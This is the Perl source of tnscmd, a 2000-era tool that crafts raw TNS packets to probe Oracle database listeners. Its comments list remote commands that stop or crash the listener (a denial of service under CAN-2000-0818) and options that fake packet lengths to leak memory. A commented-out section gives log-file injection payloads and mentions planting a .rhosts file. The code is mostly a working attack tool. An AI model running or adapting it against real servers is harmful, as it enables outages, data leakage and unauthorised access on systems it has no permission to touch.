#!/usr/bin/perl
#
# usage: tnscmd [command]
# lame tool to prod the oracle tnslsnr process (15{2|4}1/tcp)
# see also: http://www.jammed.com/~jwa/hacks/tns-advisory.txt
#
# jwa@jammed.com 5 oct 2000
#
# GPL'd, of course. http://www.gnu.org/copyleft/gpl.html
# highly alpha. more comments than code. wooga.
#
# sample usage: (long lines are broken up)
#
# to send a TNS 'PING' to an oracle server:
#
# unix% tnscmd -h some.oracle.server
# connect writing 87 bytes [(CONNECT_DATA=(COMMAND=ping))]
# .W.......6.,...............:................4.............
# (CONNECT_DATA=(COMMAND=ping))
# read
# .I......"..=(DESCRIPTION=(TMP=)(VSNNUM=135294976)(ERR=0)(ALIAS=LISTENER))
# eon
#
# to send a TNS 'VERSION' command:
#
# unix% tnscmd version -h some.oracle.server
# connect writing 90 bytes [(CONNECT_DATA=(COMMAND=version))]
# .Z.......6.,...............:................4.............
# (CONNECT_DATA=(COMMAND=version))
# read
# .M.......6.........-............(DESCRIPTION=(TMP=)(VSNNUM=
# 135294976)(ERR=0)).b........TNSLSNR.for.Solaris:.Version.8.1
# .7.0.0.-.Production..TNS.for.Solaris:.Version.8.1.7.0.0.-.Pr
# oduction..Unix.Domain.Socket.IPC.NT.Protocol.Adaptor.for.Sol
# aris:.Version.8.1.7.0.0.-.Development..Oracle.Bequeath.NT.Pr
# otocol.Adapter.for.Solaris:.Version.8.1.7.0.0.-.Production..
# TCP/IP.NT.Protocol.Adapter.for.Solaris:.Version.8.1.7.0.0.-.
# Production,,.........@
# eon
#
# Some commands:
# (intuited from `strings /u01/app/oracle/product/8.1.6//bin/tnslsnr`)
#
# ping - pings the listener (default)
# debug - dumps debugging info to the listener log
# (/u01/app/oracle/product/8.1.6/network/log/listener.log)
# dispatch - ?
# establish - "TNS-12504: TNS:listener was not given the SID in CONNECT_DATA"
# reload - reloads config file
# 06-OCT-2000 23:37:03 * (CONNECT_DATA=(COMMAND=reload)) * reload * 0
# 06-OCT-2000 23:37:03 * service_register * pr01dev * 0
# services - dumps all sorts of chilly data
# save_config - writes config to a backup file. (can this be
# specified remotely? hrm)
#
# status - will show if password for tns listener has been set "security=off"
#
# trace - needs a "trace level", unsure of the syntax here
# version - pretty output of the installed TNS listener version(s)
# stop - shuts the listener down (on purpose). if the DBA has set the
# database up properly, this should not work without a password.
#
# these commands will kill the listener (will DoS Oracle 8.1.6; 8.1.7 is
# not affected. See:
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2000-0818
# http://otn.oracle.com/deploy/security/alerts.htm
# http://xforce.iss.net/alerts/advise66.php
# (No, I didn't know ISS was working on this, too..)
#
# trc_file
# trc_level
# use_plugandplay
# trc_directory
# snmp_visible
# log_file
# log_status
# log_directory
#
# most of these will show up in the listner log
# (/u01/app/oracle/product/8.1.6/network/log/listener.log) .. but they
# don't show an originating IP. gah.
#
#

use Socket;
select(STDOUT);$|=1;

$cmd = $ARGV[0] if ($ARGV[0] !~ /^-/);

while ($arg = shift @ARGV) {
  $hostname = shift @ARGV if ($arg eq "-h");
  $port = shift @ARGV if ($arg eq "-p");
  $debug = 1 if ($arg eq "-d");
  $debug_octal = 1 if ($arg eq "-o");
  $logfile = shift @ARGV if ($arg eq "--logfile");
  $fakepacketsize = shift @ARGV if ($arg eq "--packetsize");
  $fakecmdsize = shift @ARGV if ($arg eq "--cmdsize");
}

if ($hostname eq "") {
  print <<_EOF_;
usage: $0 [command] -h hostname [-p port]
       where 'command' is something like ping, version, status, etc.
       (default is ping)
       [--packetsize bytes] - fake TNS packet size
       [--cmdsize bytes] - fake TNS command size (reveals packet leakage --
            see http://www.jammed.com/~jwa/hacks/tns-advisory.txt)
       [--logfile logfile] - write raw packets to specified logfile
       [-d] - dump packet contents
       [-o] - dump packet contents in octal (how retro)
_EOF_
  exit(0);
}

$cmd = "ping" if ($cmd eq "");
$port = 1541 if ($port eq ""); # 1541, 1521.. DBAs are so whimsical.


# sneaky things:

# to write arbitrary commands; ie "(SID=foo)(COMMAND=log_file)(arguments=1)(value=/tmp/somefile)"
#$command = "(CONNECT_DATA=($cmd)";

# push arbitrary stuff in the log file. (this is simply an invalid packet.)
#$command = "(CONNECT_DATA=((" . "\n+ +\n" . "sid=foo)(command=log_file))(arguments=1)(value=/tmp/lsnr.log))";
# use finger to find out the home directory, then make an .rhosts. blah.

# default behaviour for now

$command = "(CONNECT_DATA=(COMMAND=$cmd))";

# "calculate" command length
if (defined($fakecmdsize)) {
  $cmdlen = $fakecmdsize;
  print "Faking command length to $cmdlen bytes\n";
} else {
  $cmdlen = length($command);
}
$cmdlenH = $cmdlen >> 8;
$cmdlenL = $cmdlen & 0xff;
$cmdlenH = sprintf "%.2x", $cmdlenH;
$cmdlenL = sprintf "%.2x", $cmdlenL;

# calculate packet length
if (defined($fakepacketsize)) {
  $packetlen = $fakepacketsize; # lie
  print "Faking packet length to $cmdlen bytes\n";
} else {
  $packetlen = length($command) + 58; # "preamble" is 58 bytes
}

$packetlenH = $packetlen >> 8;
$packetlenL = $packetlen & 0xff;
$packetlenH = sprintf "%.2x", $packetlenH;
$packetlenL = sprintf "%.2x", $packetlenL;

$packetlen = length($command) + 58 if (defined($fakepacketsize));

$cmd = hexify($command);

# decimal offset
# 0: packetlen_high packetlen_low
# 26: cmdlen_high cmdlen_low
# 58: command

# the packet.

$bytes="
$packetlenH $packetlenL 00 00 01 00 00 00 01 36 01 2c 00 00 08 00
7f ff 7f 08 00 00 00 01 $cmdlenH $cmdlenL 00 3a 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 34 e6 00 00
00 01 00 00 00 00 00 00 00 00 $cmd";

# ok, now send it

print "connect ";
tcp_open($hostname, $port);

print "writing $packetlen bytes [$command]\n";

@n = split(" ", $bytes);
$packetlen = @n;
$count = 0;

if (defined($logfile)) {
  open(SEND, ">$logfile.send") || die "can't write $logfile.send: $!";
}

while (@n) {
  $count++;
  $n = shift @n;
  if (length($n) == 2) {
    chomp $n;
    print SOCK chr(hex($n));
    print SEND chr(hex($n)) if (defined($logfile));
    pdump(chr(hex($n)));
  } else {
    # won't happen any more
    print STDERR "oops, [$bytes] are whacked\n";
    exit(0);
  }
}
close (SEND) if (defined($logfile));

print "\n";

print "** warning: $count != $packetlen\n" if ($count != $packetlen); # won't happen anymore

print "read\n";

# get fun data
# 1st 12 bytes have some meaning which so far eludes me

if (defined($logfile)) {
  open(REC, ">$logfile.rec") || die "can't write $logfile.rec: $!";
}
$pdump_count = 0;
while (read(SOCK, $buf, 1)) {
  print REC $buf;
  pdump($buf);
}
print "\neon\n";
close(SOCK);
close(REC) if (defined($logfile));

exit(0);



sub hexify {
  my ($input) = shift @_;
  my ($output, $i);

  for ($i=0;$i<length($input);$i++) {
    $output .= sprintf "%.2x ", ord(substr($input, $i, 1));
  }
  return $output;
}

sub tcp_open {
        local ($host, $port) = @_;
        local ($iaddr, $paddr, $proto);
        local $tomsg = "connect timed out";

        $iaddr = inet_aton($host);
        $paddr = sockaddr_in($port, $iaddr);
        $proto = getprotobyname('tcp');

        die "Bad hostname" if ($iaddr eq "");
        socket (SOCK, PF_INET, SOCK_STREAM, $proto) || die "socket: $!";

        local ($SIG{ALRM}) = sub { die $tomsg };
        alarm($open_timeout);

        eval {
                connect (SOCK, $paddr);
        };

        alarm(0);

  select (SOCK);$|=1;select(STDOUT);

        if ($@ =~ /^$tomsg/) {
               die "connect: $tomsg";
        }
}

# fuggly packet dump

sub pdump {
  my ($c) = ord(shift @_);

  if ($debug) {
    printf "%.2x", $c;
  } elsif ($debug_octal) {
    printf "\\%o", $c; # nmap+V..
    return;
  }
  if (($c > 32) && ($c < 127)) {
    if ($debug) {
      print " " . chr($c) . " ";
    } else {
      print chr($c);
    }
  } else {
    if ($debug) {
      print " . ";
    } else {
      print ".";
    }
  }

  print "\n" if (((++$pdump_count) % 16 == 0) && ($debug));
}
p


























